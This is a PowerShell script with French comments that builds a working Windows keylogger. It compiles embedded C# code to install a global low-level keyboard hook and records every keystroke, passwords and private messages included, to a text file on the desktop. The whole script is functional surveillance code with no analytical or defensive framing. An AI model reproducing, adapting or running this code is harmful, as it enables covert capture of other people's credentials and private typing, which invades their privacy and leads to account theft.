# -------------------------------------------------------------
# KEYLOGGER NATIF WINDOWS (POWERSHELL STABLE)
# -------------------------------------------------------------

# 1. Chargement des dépendances .NET (CRITIQUE)
try {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
} catch {
    Write-Host "[ERREUR FATALE] Impossible de charger Windows.Forms." -ForegroundColor Red
    Read-Host "Appuyez sur Entree pour quitter..."
    Exit
}

$LogFile = "$env:USERPROFILE\Desktop\keylogs.txt"

# 2. Code C# (Win32 API Hook)
$Source = @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Diagnostics;

public class Logger {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static string _logPath = "";

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    public static void Start(string path) {
        _logPath = path;
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            // Capture simple
            string key = ((Keys)vkCode).ToString();
            
            // Logique d'écriture
            try {
                using (StreamWriter sw = File.AppendText(_logPath)) {
                    sw.Write(key + " ");
                }
                Console.Write(key + " ");
            } catch {}
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
}
"@

# 3. Compilation et Lancement
Clear-Host
Write-Host "--- INITIALISATION ---" -ForegroundColor Cyan

try {
    Add-Type -TypeDefinition $Source -ReferencedAssemblies System.Windows.Forms, System.Drawing
} catch {
    Write-Host "[ERREUR DE COMPILATION C#]" -ForegroundColor Red
    Write-Host $_.Exception.Message
    Read-Host "Appuyez sur Entree pour voir l'erreur..."
    Exit
}

Write-Host "[SUCCES] Keylogger actif." -ForegroundColor Green
Write-Host "[INFO] Fichier de sortie : $LogFile"
Write-Host "[INFO] Ne fermez pas cette fenetre pour continuer la capture."
Write-Host ""

# Lancement effectif
try {
    [Logger]::Start($LogFile)
} catch {
    Write-Host "[ERREUR D'EXECUTION] : $_" -ForegroundColor Red
}

# Cette ligne empêche la fenêtre de se fermer en cas de crash
Read-Host "Script termine. Appuyez sur Entree..."
